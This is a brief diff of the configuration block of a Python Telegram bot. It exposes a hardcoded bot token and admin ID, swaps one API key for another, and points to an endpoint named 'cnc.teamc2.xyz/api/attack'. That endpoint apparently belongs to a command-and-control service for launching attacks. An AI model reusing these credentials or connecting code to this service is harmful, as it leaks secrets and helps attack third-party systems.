@@ -16,7 +16,7 @@ from pymongo import MongoClient
 BOT_TOKEN = "8760406918:AAEdHzZ2HDX3ILowFfMzpAs1zutEX8VUOnc"
 ADMIN_ID = ["8487946379"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
-API_KEY = "UYK5UU"
+API_KEY = "WTRMWL"
 MAX_CONCURRENT = 2
 
 # ========== MONGODB CONNECTION ==========
